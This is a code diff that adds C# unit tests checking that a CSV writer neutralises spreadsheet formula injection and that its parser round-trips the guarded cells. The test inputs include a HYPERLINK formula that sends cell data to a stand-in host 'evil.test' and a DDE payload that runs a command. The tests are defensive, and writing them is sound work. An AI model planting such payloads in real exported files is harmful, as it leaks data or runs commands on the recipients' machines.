@@ -52,6 +52,68 @@ public sealed class CsvIdeaTests
         Assert.Equal("line\nbreak", back[2][1]);
     }
 
+    // CWE-1236 (formula injection). A cell beginning '=', '+', '-', '@', tab, or CR is evaluated
+    // as a formula by Excel/Sheets/LibreOffice on open, so idea content authored by any member
+    // could execute in an admin's spreadsheet. Csv.Write guards it; Csv.Parse strips the guard.
+    [Theory]
+    [InlineData("=HYPERLINK(\"http://evil.test?d=\"&A1,\"click\")")]
+    [InlineData("=cmd|'/c calc'!A1")]
+    [InlineData("+1+1")]
+    [InlineData("-2+3")]
+    [InlineData("@SUM(A1:A9)")]
+    [InlineData("\tleading tab")]
+    [InlineData("\rleading cr")]
+    public void Csv_Write_GuardsFormulaTriggeringCells(string dangerous)
+    {
+        var csv = Csv.Write(new[] { "Title" }, new[] { (IReadOnlyList<string>)new[] { dangerous } });
+
+        var dataLine = csv.Split("\r\n")[1];
+
+        // The payload must not be the first character of the emitted cell — quoted or not.
+        Assert.DoesNotContain($"\r\n{dangerous[0]}", csv);
+        Assert.StartsWith("'", dataLine.TrimStart('"'));
+    }
+
+    [Fact]
+    public void Csv_Write_LeavesOrdinaryCellsUnguarded()
+    {
+        var csv = Csv.Write(new[] { "Title" }, new[]
+        {
+            (IReadOnlyList<string>)new[] { "Reduce approval steps" },
+            new[] { "'tis a quoted phrase" },
+        });
+
+        Assert.Contains("\r\nReduce approval steps\r\n", csv);
+        // A value that genuinely starts with an apostrophe is not double-guarded.
+        Assert.Contains("\r\n'tis a quoted phrase\r\n", csv);
+    }
+
+    [Theory]
+    [InlineData("=1+1")]
+    [InlineData("-danger")]
+    [InlineData("@x")]
+    [InlineData("plain value")]
+    [InlineData("'tis a quoted phrase")]
+    [InlineData("has, comma")]
+    public void Csv_WriteThenParse_RoundTripsGuardedCellsLosslessly(string original)
+    {
+        var csv = Csv.Write(new[] { "Title" }, new[] { (IReadOnlyList<string>)new[] { original } });
+
+        var back = Csv.Parse(csv);
+
+        Assert.Equal(original, back[1][0]);
+    }
+
+    [Fact]
+    public void Csv_Parse_StripsGuardOnlyWhenItPrecedesAFormulaTrigger()
+    {
+        var records = Csv.Parse("a\n'=1+1\n'tis\n''");
+
+        Assert.Equal("=1+1", records[1][0]);   // guard removed
+        Assert.Equal("'tis", records[2][0]);   // ordinary leading apostrophe preserved
+        Assert.Equal("''", records[3][0]);     // apostrophe not followed by a trigger, preserved
+    }
+
     [Fact]
     public void IdeaParser_MapsCellsByHeader_CaseInsensitive_AndSkipsBlankRows()
     {
